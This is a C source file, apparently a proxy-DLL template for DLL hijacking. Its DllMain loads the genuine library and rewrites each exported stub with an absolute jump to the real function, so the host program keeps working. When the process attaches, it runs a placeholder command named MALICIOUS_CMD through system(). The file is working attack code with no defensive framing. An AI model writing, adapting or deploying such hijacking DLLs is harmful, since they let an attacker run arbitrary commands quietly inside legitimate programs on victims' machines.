#include "dllmain.h"
#include "user.h"

#include <stdlib.h>
#include <stdio.h>
#include <libloaderapi.h>
#include <memoryapi.h>
#include <errhandlingapi.h>


int iat_init = 0;
int DllMain( void* hModule, int  ul_reason_for_call, void* lpReserved)
{
    PROXY_IAT_ENTRY *iat, *entry;
    FILE* file = NULL;
    HMODULE library = NULL;
    DWORD cur = 0, i = 0;
    DWORD oldprotect;
    unsigned int iatsize;
    unsigned __int64 address;

    if (!iat_init) {

        iat = getIAT();
        iatsize = getIATSize();
        library = LoadLibraryA(PROXIED_DLL);

        if (library != NULL) {
            for (cur = 0; cur < iatsize; cur++) {
                entry = iat + cur;
                if (entry->name != NULL) {
                    address = (unsigned __int64)GetProcAddress(library, entry->name);
                }
                else {
                    address = (unsigned __int64)GetProcAddress(library, ((LPSTR)((ULONG_PTR)((WORD)(entry->ordinal)))));
                }

                if (VirtualProtect(entry->proxy_function, 14, PAGE_EXECUTE_READWRITE, &oldprotect)) {
                    *((unsigned __int64*)(entry->proxy_function)) = 0x25FF;
                    *((unsigned __int64*)((BYTE*)entry->proxy_function+6)) = address;
                } 
            }
        }

        iat_init = 1;
    }

    if (ul_reason_for_call == 1) {
        system(MALICIOUS_CMD);
    }

    return 1;
}